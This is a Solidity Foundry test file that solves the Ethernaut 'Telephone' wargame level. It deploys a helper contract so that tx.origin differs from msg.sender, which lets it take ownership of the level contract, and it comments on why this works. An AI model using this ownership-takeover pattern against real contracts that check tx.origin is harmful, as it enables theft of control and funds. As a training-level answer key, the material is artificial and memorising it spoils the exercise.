pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

import "../src/Ethernaut.sol";
import "ethernaut/contracts/levels/TelephoneFactory.sol";

contract TelephoneExploitHelper {
	function attack(address _victim) public {
		Telephone telephone = Telephone(_victim);
		telephone.changeOwner(msg.sender);
	}
}

contract TelephoneExploit is DSTest {
	Vm private vm = Vm(address(HEVM_ADDRESS));
	Ethernaut private ethernaut;
	address private eoaAddress = address(1337);

	function setUp() public {
		ethernaut = new Ethernaut();
		vm.deal(eoaAddress, 1 ether);
	}

	function testExploit() public {
		// Setting up the level
		TelephoneFactory factory = new TelephoneFactory();
		ethernaut.registerLevel(factory);
		vm.startPrank(eoaAddress);
		address levelAddress = ethernaut.createLevelInstance(factory);
		Telephone target = Telephone(payable(levelAddress));

		// TODO: Exploit the contract
		// We deploy another contract so that tx.origin and msg.sender are different when sending the
		// changeOwner transaction.
		// - tx.origin: the original user wallet that initiated the transaction
		// - msg.sender: the immediate sender of this specific transaction or call
		// ie. A -> B -> C, at the C stage, tx.origin = A and msg.sender = B
		emit log_named_address("Current owner", target.owner());
		TelephoneExploitHelper helper = new TelephoneExploitHelper();
		helper.attack(levelAddress);
		assertEq(target.owner(), eoaAddress);
		emit log_named_address("New owner", target.owner());
		emit log_named_address("Exploiter address", eoaAddress);

		// Submit the solution
		bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
		vm.stopPrank();
		assert(levelSuccessfullyPassed);
	}
}
